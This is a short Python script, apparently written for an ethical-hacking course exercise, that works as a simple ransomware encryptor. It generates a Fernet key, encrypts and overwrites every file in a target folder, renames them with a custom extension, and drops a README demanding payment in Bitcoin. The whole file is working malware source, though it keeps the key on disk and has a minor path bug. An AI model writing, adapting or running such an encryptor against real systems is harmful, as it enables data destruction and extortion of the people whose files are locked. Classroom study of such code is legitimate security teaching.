# -*- coding: utf-8 -*-

###########################################
# CifradoRansomwareJuanPabloLondoño
###########################################

from cryptography.fernet import Fernet
import os

###########################################

# Extensión de los archivos secuestrados
extension = 'IUEHackeoEtico202302'

# Generación de la llave de cifrado
def generar_key():
    key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file:
        key_file.write(key)

# Cargar la llave generada
def cargar_key():
    return open('key.key', 'rb').read()

# Cifrar y renombrar archivos
def cifrar(items, key):
    f = Fernet(key)
    for item in items:
        # Leo el archivo
        with open(item, 'rb') as file:
            file_data = file.read()

        encrypted_data = f.encrypt(file_data)  # Changed 'encrypted' to 'encrypt'

        # Escribo archivo
        with open(item, 'wb') as file:
            file.write(encrypted_data)

        os.rename(item, item + '.' + extension)

if __name__ == '__main__':
    path_to_encrypt = 'C:/Users/JuanPablo/Documents/HE/prueba'
    items = os.listdir(path_to_encrypt)
    full_path = [os.path.join(path_to_encrypt, item) for item in items]  # Used os.path.join for path

    generar_key()
    key = cargar_key()
    cifrar(full_path, key)

    with open(path_to_encrypt + 'README.txt', 'w') as file:  # Removed unnecessary '\\'
        file.write('Pague con Bitcoins')
